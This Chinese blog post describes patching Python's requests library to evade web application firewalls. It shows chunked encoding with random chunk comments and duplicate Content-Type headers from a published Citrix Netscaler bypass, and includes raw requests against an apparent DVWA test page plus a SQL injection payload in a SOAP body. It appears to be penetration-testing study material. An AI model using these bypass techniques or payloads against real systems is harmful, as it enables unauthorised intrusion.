# 前言
最近有WAF bypass的需求，学习了下分块传输的方法，网上也有[burp插件](https://github.com/c0ny1/chunked-coding-converter)，需要使用python实现一下，在使用requests实现时遇到了一些坑，记录下。

# requests分块编码请求

https://docs.python-requests.org/zh_CN/latest/user/advanced.html?highlight=%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93#chunk-encoding

请求参数`data`提供一个生成器即可

首次引入分块传输：

https://github.com/psf/requests/commit/ef8563ab36c6b52834ee9c35f6f75a424cd9ceef

# 使用burp代理分块传输不生效
为了可以准确的看到代码是否生效，我给requests配上了burp代理，但是在看burp捕获的报文中发现分块传输并未生效
## 结论
并不是使用了burp代理后requests分块传输不生效，而是分块传输发生在Client与代理Server之间，burp请求转发并没有使用分块传输，所以在burp上的抓包情况看没有使用分块传输。
## 抓包验证
### 本地抓包 (Client与代理Server)

```
POST http://xxcdd.for.test.com/vulnerabilities/exec/ HTTP/1.1
Host: xxcdd.for.test.com
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)
Accept-Language: zh-cn,en-us;q=0.7,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Cookie: security=low; PHPSESSID=f49c32abdce4380305503cde9e522e67
Transfer-Encoding: chunked

2
ip
3
=12
1
7
3
.0.
3
0.1
1
&
1
S
2
ub
3
mit
3
=Su
2
bm
2
it
0

HTTP/1.1 200 OK
Date: Sat, 08 May 2021 08:31:10 GMT
Server: Apache/2.4.39 (Unix) OpenSSL/1.0.2s PHP/7.3.7 mod_perl/2.0.8-dev Perl/v5.16.3
X-Powered-By: PHP/7.3.7
Expires: Tue, 23 Jun 2009 12:00:00 GMT
Cache-Control: no-cache, must-revalidate
Pragma: no-cache
Content-Length: 4489
Connection: close
Content-Type: text/html;charset=utf-8

<!DOCTYPE html>
```

### burp请求转发

```
POST /vulnerabilities/exec/ HTTP/1.1
Host: xxcdd.for.test.com
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)
Accept-Language: zh-cn,en-us;q=0.7,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Cookie: security=low; PHPSESSID=f49c32abdce4380305503cde9e522e67
Content-Length: 26

ip=127.0.0.1&Submit=SubmitHTTP/1.1 200 OK
Date: Sat, 08 May 2021 08:34:44 GMT
Server: Apache/2.4.39 (Unix) OpenSSL/1.0.2s PHP/7.3.7 mod_perl/2.0.8-dev Perl/v5.16.3
X-Powered-By: PHP/7.3.7
Expires: Tue, 23 Jun 2009 12:00:00 GMT
Cache-Control: no-cache, must-revalidate
Pragma: no-cache
Content-Length: 4489
Connection: close
Content-Type: text/html;charset=utf-8

<!DOCTYPE html>
```


# Debug requests的分块传输过程

## 确定断点

requests源代码全局搜索`chunked`，确定断点

```
requests/models.py      PreparedRequest.prepare_body
requests/sessions.py    Session.get_adapter
requests/adapters.py    HTTPAdapter.send
```

## 逐个分析

### `requests/models.py      PreparedRequest.prepare_body`

该方法中自动在请求头中增加 `Transfer-Encoding: chunked`，有两个条件：

1.  is_stream=True

```
is_stream = all([
            hasattr(data, '__iter__'),
            not isinstance(data, (basestring, list, tuple, Mapping))
        ])
```

**问题**：`not isinstance(data, (basestring, list, tuple, Mapping))`是何意

2. 请求体有长度

```
def prepare_body(self, data, files, json=None):
    ...
    is_stream = all([
            hasattr(data, '__iter__'),
            not isinstance(data, (basestring, list, tuple, Mapping))
        ])
     try:
         length = super_len(data)
     except (TypeError, AttributeError, UnsupportedOperation):
         length = None
     if is_stream:
         ...
         if length:
             self.headers['Content-Length'] = builtin_str(length)
         else:
             self.headers['Transfer-Encoding'] = 'chunked'
     else:
         ...
```



### `requests/sessions.py    Session.get_adapter`

```
    def get_adapter(self, url):
        """
        Returns the appropriate connection adapter for the given URL.

        :rtype: requests.adapters.BaseAdapter
        """
        for (prefix, adapter) in self.adapters.items():

            if url.lower().startswith(prefix.lower()):
                return adapter

        # Nothing matches :-/
        raise InvalidSchema("No connection adapters were found for '%s'" % url)
```

获取处理URL的adapter，adapter在Session类的域adapters中

```
Session生成器中：
# Default connection adapters.
self.adapters = OrderedDict()
self.mount('https://', HTTPAdapter())
self.mount('http://', HTTPAdapter())

打印出相关：
>>> print self.adapters
OrderedDict([('https://', <requests.adapters.HTTPAdapter object at 0x000000000490C3C8>), ('http://', <requests.adapters.HTTPAdapter object at 0x000000000490C7B8>)])
```

获取到了adapter，则调用其send方法，来到下一个断点

### `requests/adapters.py    HTTPAdapter.send`

发送 PreparedRequest object. 返回 Response object

```
chunked = not (request.body is None or 'Content-Length' in request.headers)

if not chunked:
    正常发包
else:
    分块传输
    建立TCP连接
    发送请求头
    发送分块传输的请求体
    for i in request.body:
        low_conn.send(hex(len(i))[2:].encode('utf-8'))
        low_conn.send(b'\r\n')
        low_conn.send(i)
        low_conn.send(b'\r\n')
    low_conn.send(b'0\r\n\r\n')
    接收响应内容
```

找到了发送分块传输的请求体的代码后，我们就可以开始魔改了

# 魔改 requests符合自己的需求

## 需求

可以发送带注释的分块传输

原始的分块传输是：

```
POST http://xxcdd.for.test.com/vulnerabilities/exec/ HTTP/1.1
Host: xxcdd.for.test.com
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)
Accept-Language: zh-cn,en-us;q=0.7,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Cookie: security=low; PHPSESSID=f49c32abdce4380305503cde9e522e67
Transfer-Encoding: chunked

2
ip
3
=12
1
7
3
.0.
3
0.1
1
&
1
S
2
ub
3
mit
3
=Su
2
bm
2
it
0


```

绕WAF期望的分块传输是：

```
POST /vulnerabilities/exec/ HTTP/1.1
Host: xxcdd.for.test.com
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)
Accept-Language: zh-cn,en-us;q=0.7,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Cookie: security=low; PHPSESSID=f49c32abdce4380305503cde9e522e67
Content-Length: 269
Transfer-Encoding: chunked

3;9HMbo4HFtRCJQwAJW57tz0
ip=
3;70ixfv
127
2;ouCHr3
.0
2;ZXjKnAt0
.0
2;FcpKzNTK
.1
2;JWf1je
&S
2;aiV0XrBKQFLb
ub
2;S61NU
mi
1;MHr680eEyUqR6
t
1;OWOo9
=
1;AxsgGW9aizzJd5IRtJHGuRHPH
S
1;xb9ktTyWrAbhV2OkE
u
3;mtBp1OEKySwUhyyh
bmi
1;0CzTD
t
0


```

## 重写相关代码

在`requests/sessions.py    Session.get_adapter`中我们看到默认的adapter是HTTPAdapter，要想达到期望，就要对发送分块传输的请求体的部分进行重写

```
class ChunkedHTTPAdapter(HTTPAdapter):
    def send(self, request, stream=False, timeout=None, verify=True, cert=None, proxies=None):
        ...
        for i in request.body:
        #     low_conn.send(hex(len(i))[2:].encode('utf-8'))
        #     low_conn.send(b'\r\n')
            low_conn.send(i)
        #     low_conn.send(b'\r\n')
        # low_conn.send(b'0\r\n\r\n')
        ...
```

传入的`request.body`为`iterator`，内容是构造好的带注释的分块传输内容，相当于不让requests构造分块传输请求体，我们提前构造好传入，ChunkedHTTPAdapter只管发送就好。

## mount

关于adapter的mount，注释中给了示例：

```
Usage::
          >>> import requests
          >>> s = requests.Session()
          >>> a = requests.adapters.HTTPAdapter(max_retries=3)
          >>> s.mount('http://', a)
```

结合上面的分析Session生成器中的处理最终为：

```
    s = requests.Session()
    a = ChunkedHTTPAdapter(max_retries=3)
    s.mount('http://', a)
    s.mount('https://', a)
    response = s.post(burp0_url, cookies=burp0_cookies, headers=burp0_headers, data=iter(list_chunked),
                             verify=False)
```

## 再度魔改

将分块传输和正常的请求逻辑整合为统一的代码，以便于其他魔改

```
class HTTPAdapter(BaseAdapter):
    def send(self, request, stream=False, timeout=None, verify=True, cert=None, proxies=None):
        ...
        if hasattr(request.body, '__iter__'):
            # 分块传输
            for i in request.body:
                low_conn.send(i)
        else:
            # 非分块传输
            low_conn.send(request.body)
```

又有个需求：[Citrix Netscaler NS10.5 - WAF Bypass (Via HTTP Header Pollution)](https://www.exploit-db.com/exploits/36369)

要求为：

```
First request: ‘ union select current_user,2# - Netscaler blocks it.

Second request: The same content and an additional HTTP header which is “Content-Type: application/octet-stream”. - It bypasses the WAF but the web server misinterprets it.

Third request: The same content and two additional HTTP headers which are “Content-Type: application/octet-stream” and “Content-Type: text/xml” in that order. The request is able to bypass the WAF and the web server runs it.
```

请求报文大概类似：

```
POST /test HTTP/1.1
Host: xxcdd.for.test.com
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)
Accept-Language: zh-cn,en-us;q=0.7,en;q=0.3
Content-Type: application/octet-stream
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      	<string>’ union select current_user, 2#</string> 
	 
	</soapenv:Body>
</soapenv:Envelope>
```

需要发送两个Content-Type请求头，再次魔改：

```
class HTTPAdapter(BaseAdapter):
    def send(self, request, stream=False, timeout=None, verify=True, cert=None, proxies=None):
        ...
        try:
            low_conn.putrequest(request.method,
                                url,
                                skip_accept_encoding=True)
            for header, value in request.headers.items():
                # 这里当header == "Content-Type" 时，执行low_conn.putheader("Content-Type", "application/octet-stream")
                low_conn.putheader(header, value)
```

# 后记

虽然上述的需求通过socket编程发送http请求也可以满足，但是在一个渗透项目的设计中，http的处理应该尽可能做到统一输入输出，统一使用requests库去处理http请求会使得总体设计更加简洁和有序。经过这次的折腾让我对requests库的源代码更加熟悉了，相信下次再遇到奇怪的http请求需求，魔改起来更加得心应手。
